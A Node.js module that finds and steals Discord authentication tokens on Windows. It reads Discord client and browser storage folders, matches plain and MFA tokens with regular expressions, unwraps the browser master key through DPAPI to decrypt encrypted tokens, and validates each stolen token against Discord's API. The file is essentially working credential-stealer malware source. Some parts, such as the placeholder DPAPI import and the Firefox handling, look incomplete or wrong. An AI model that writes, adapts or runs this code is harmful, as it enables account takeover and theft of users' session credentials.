const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const https = require('https');
const sqlite3 = require('sqlite3').verbose();
const { Dpapi } = require('datavault-win'); // Placeholder for Windows DPAPI unprotection

/**
 * Validates a Discord token by making a request to the @me endpoint.
 * @param {string} token - The Discord token to validate.
 * @returns {Promise<object|null>} - User info if valid, null otherwise.
 */
async function validateToken(token) {
    if (!token || token.length < 50) return null;

    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        resolve(null);
                    }
                } else {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.end();
    });
}

/**
 * Extracts Discord tokens from a given LevelDB directory.
 * Supports both plain as well as v10-encrypted tokens.
 * @param {string} storagePath - Path to the LevelDB directory.
 * @param {Buffer|null} masterKey - Key for v10 decryption (if applicable).
 * @returns {Promise<string[]>} - List of unique tokens.
 */
async function extractFromLevelDB(storagePath, masterKey) {
    const tokens = new Set();
    if (!await fs.pathExists(storagePath)) return [];

    try {
        const files = await fs.readdir(storagePath);
        for (const file of files) {
            if (file.endsWith('.log') || file.endsWith('.ldb')) {
                const content = await fs.readFile(path.join(storagePath, file), 'utf-8');

                // Plain tokens
                const plainMatches = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,37}/g) || [];
                const mfaMatches = content.match(/mfa\.[\w-]{84}/g) || [];

                plainMatches.forEach(t => tokens.add(t));
                mfaMatches.forEach(t => tokens.add(t));

                // Encrypted tokens (v10)
                if (masterKey) {
                    const encryptedMatches = content.match(/dQw4w9WgXcQ:[^" ]+/g) || [];
                    for (const match of encryptedMatches) {
                        try {
                            const encryptedBuffer = Buffer.from(match.split(':')[1], 'base64');
                            const iv = encryptedBuffer.slice(3, 15);
                            const payload = encryptedBuffer.slice(15);
                            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                            decipher.setAuthTag(payload.slice(payload.length - 16));
                            const decrypted = Buffer.concat([decipher.update(payload.slice(0, payload.length - 16)), decipher.final()]);
                            tokens.add(decrypted.toString());
                        } catch (e) {
                            // Decryption failed for this match
                        }
                    }
                }
            }
        }
    } catch (e) { }
    return Array.from(tokens);
}

/**
 * Gets the master key for modern Chromium-based browsers (used for v10 token encryption).
 * @param {string} localStatePath - Path to the 'Local State' JSON file.
 * @returns {Promise<Buffer|null>} - The decrypted master key or null.
 */
async function getMasterKey(localStatePath) {
    if (!await fs.pathExists(localStatePath)) return null;
    try {
        const localState = await fs.readJson(localStatePath);
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        const key = encryptedKey.slice(5); // Remove 'DPAPI' prefix
        return Dpapi.unprotectData(key, null, 'CurrentUser');
    } catch (e) {
        return null;
    }
}

/**
 * Scans all known locations for Discord tokens.
 * @returns {Promise<string[]>} - Combined list of all found (and uniquely validated) tokens.
 */
async function extractDiscordTokens() {
    const appData = process.env.APPDATA;
    const localAppData = process.env.LOCALAPPDATA;

    const targets = {
        'Discord': path.join(appData, 'discord'),
        'Discord Canary': path.join(appData, 'discordcanary'),
        'Discord PTB': path.join(appData, 'discordptb'),
        'Lightcord': path.join(appData, 'Lightcord'),
        'Google Chrome': path.join(localAppData, 'Google', 'Chrome', 'User Data'),
        'Brave': path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Edge': path.join(localAppData, 'Microsoft', 'Edge', 'User Data'),
        'Opera': path.join(appData, 'Opera Software', 'Opera Stable'),
        'Opera GX': path.join(appData, 'Opera Software', 'Opera GX Stable'),
        'Vivaldi': path.join(localAppData, 'Vivaldi', 'User Data'),
        'Yandex': path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data'),
        'Mozilla Firefox': path.join(appData, 'Mozilla', 'Firefox', 'Profiles')
    };

    let allTokens = new Set();

    for (const [name, basePath] of Object.entries(targets)) {
        if (!await fs.pathExists(basePath)) continue;

        if (name.includes('Firefox')) {
            // Firefox uses Profiles directory. Each profile might have storage.
            try {
                const profiles = await fs.readdir(basePath);
                for (const profile of profiles) {
                    const storagePath = path.join(basePath, profile, 'storage', 'default');
                    // Discord might be in webapps or similar under storage
                    const profileTokens = await extractFromLevelDB(storagePath, null);
                    profileTokens.forEach(t => allTokens.add(t));
                }
            } catch (e) { }
        } else if (name.includes('Discord') || name.includes('Lightcord')) {
            const ldbPath = path.join(basePath, 'Local Storage', 'leveldb');
            const masterKey = await getMasterKey(path.join(basePath, 'Local State'));
            const found = await extractFromLevelDB(ldbPath, masterKey);
            found.forEach(t => allTokens.add(t));
        } else {
            // Chromium browsers usually have 'Default' or 'Profile X'
            const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
            const masterKey = await getMasterKey(path.join(basePath, 'Local State'));

            for (const profile of profiles) {
                const ldbPath = path.join(basePath, profile, 'Local Storage', 'leveldb');
                const found = await extractFromLevelDB(ldbPath, masterKey);
                found.forEach(t => allTokens.add(t));
            }
        }
    }

    return Array.from(allTokens);
}

module.exports = {
    extractDiscordTokens,
    validateToken
};
